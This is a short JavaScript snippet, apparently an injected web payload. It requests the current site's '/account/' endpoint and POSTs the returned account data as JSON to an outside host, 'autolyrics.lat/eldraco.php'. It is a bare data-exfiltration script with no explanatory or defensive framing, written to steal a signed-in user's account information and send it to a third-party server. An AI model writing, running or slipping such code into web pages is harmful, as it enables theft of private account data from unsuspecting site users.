fetch("/account/")
  .then(r => r.json())
  .then(data => {
    return fetch("https://autolyrics.lat/eldraco.php", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(data)
    });
  });
